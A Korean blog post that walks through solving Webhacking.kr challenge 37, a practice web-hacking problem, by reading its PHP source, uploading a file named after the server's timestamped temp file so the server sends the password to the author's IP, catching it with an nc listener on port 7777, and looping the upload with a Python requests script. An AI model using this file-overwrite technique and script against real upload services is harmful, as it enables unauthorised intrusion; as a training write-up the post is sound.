---
layout: post
title: "Webhacking.kr 37번 문제"
description: ""
categories : ""
sub_categories : ""
date: 2017-07-14
tags: []
comments: true
share: true
---

![](/assets/images/posts/779/2775FB33596868D2391301.PNG)

  

37번은 250 스코어의 문제입니다.

  

문제를 보면, 알수 없는 파일 리스트와 7777 포트가 열려있는데 루프백 아이피 그리고 폼 버튼이 보입니다.

  

하단에 위치한 폼 버튼의 임의로 이미지 사진(20170213_230929.png)을 업로드 했습니다.

업로드 이 후, 이미지가 정상적으로 리스트에 나오는 것을 확인했습니다.

  

    ....numbertmp-1499973060tmp-1499996289tmp-1499996421tmp-1499996897tmp-1499996923127.0.0.1:7777

  

현재까지의 시점을 보았을 때, 이로는 정답의 실마리를 찾지 못하여

소스코드를 열어보니 `index.phps` 가 숨어있었습니다.

  

문제의 힌트를 위해 해당 파일의 경로로 이동합니다.

  

이동했다면 아래와 같이 문제를 구성하는 코드가 보일 것 입니다.

코드의 대해서 잠깐 얘기해보겠습니다.

  

로컬 시간을 `time` 변수에 대입하고 "tmp" 디렉토리에 "tmp-".$time 이라는 파일의 루프백 아이피를 넣어 생성합니다.

"tmp/.number" 파일은 파일의 갯수를 측정하는 파일로써 find 함수로 한줄 씩 읽으며 배열로 반환하고

그 수를 증가시킨 값을 다시 본 파일의 적습니다.

  

tmp 파일이 30개를 이상이면 unlink 하는 부분 또한 있는데 별로 중요한 내용은 아니니 설명하지 않겠습니다.

  

중요한 부분은 다음에 나오는 파일명 중 특정 문자열을 공백으로 치환하는 부분입니다.

치환의 대상자는 아래와 같다.

  

  * <
  * >
  * ,
  * .
  * space 

  

tmp 디렉토리 이하에서 업로드 된 파일명을 쓰기 모드로 열고 클라이언트의 공인 ip를 작성합니다.

  

이후 소켓 함수를 이용하여 ck 변수에 저장된 ip 값의 7777 포트로 연결합니다.

연결 뒤에는 request 변수에 저당된 값을 발신합니다.

  

이 것이 내가 수신 받아야할 정답 값인 것 입니다.

  

문제에서 요청 시 7777포트로 요청 아이피에 정답을 발신합니다.

정답을 수신하기 위해 nc를 사용하여 7777 포트를 열어줍니다.

  

    nc - nvl -p 7777

  

이 후 공유기 사용자의 경우 포트 포워드 설정해주시면됩니다.

  

  

매 요청 시 "tmp-{구분자 = 시간}" 값이 동적으로 변하기에 이를 저는 loop 를 사용하여 해결했습니다.

소스는 아래와 같습니다.

  

  

    import requestsurl = 'http://webhacking.kr/challenge/web/web-18/index.php'files = {	'upfile' : ('tmp-1500000845',open('tmp-1500000845','rb'),'multipart/form-data')}cookies = {	'PHPSESSID': '세션 키 값'}for i in xrange(60):	response=requests.post(url, files = files, cookies = cookies)	print response.text

  

    $pw="???";$time=time();$f=fopen("tmp/tmp-$time","w");fwrite($f,"127.0.0.1");fclose($f);$fck=@file("tmp/.number");if($fck) $fck=$fck[0];if(!$fck) $fck=0;$fck++;$f2=fopen("tmp/.number","w");fwrite($f2,$fck);fclose($f2);$file_nm=$HTTP_POST_FILES[upfile][name];$file_nm=str_replace("","",$file_nm);$file_nm=str_replace(".","",$file_nm);$file_nm=str_replace(" ","",$file_nm);if($file_nm){$f=@fopen("tmp/$file_nm","w");@fwrite($f,$_SERVER[REMOTE_ADDR]);@fclose($f);}echo("");$kk=scandir("tmp");for($i=0;$i");$ck=file("tmp/tmp-$time");$ck=$ck[0];$request="GET /$pw HTTP/1.0\r\n";$request.="Host: $ck\r\n";$request.="\r\n";$socket=@fsockopen($ck,7777,$errstr,$errno,1);@fputs($socket,$request);@fclose($socket);echo("$ck:7777");if($fck>=30){$kk=scandir("tmp");for($i=0;$i<=count($kk);$i++){@unlink("tmp/$kk[$i]");}}

  
  
클리어 !

  

